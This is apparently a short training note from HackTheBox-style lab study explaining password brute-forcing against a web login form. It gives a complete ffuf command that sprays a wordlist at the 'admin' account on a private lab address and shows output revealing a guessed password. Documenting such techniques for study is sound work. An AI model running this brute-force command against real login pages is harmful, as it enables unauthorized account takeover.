---
title: Password Bruteforce
draft: false
tags:
  - ffuf
---
After successfully identifying valid users, password-based authentication relies on the password as a sole measure for authenticating the user. Since users tend to select an easy-to-remember password, attackers may be able to guess or brute-force it.

The success of a brute-force attack entirely depends on the number of attempts an attacker can perform and the amount of time the attack takes. So, a good wordlist is crucial to have.

Upon providing an incorrect username, the login response contains the message (substring) "Invalid username", therefore, we can use this information to build our `ffuf` command to brute-force the user's password:

```shell-session
jadu101@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4764ms]
    * FUZZ: Buttercup1
```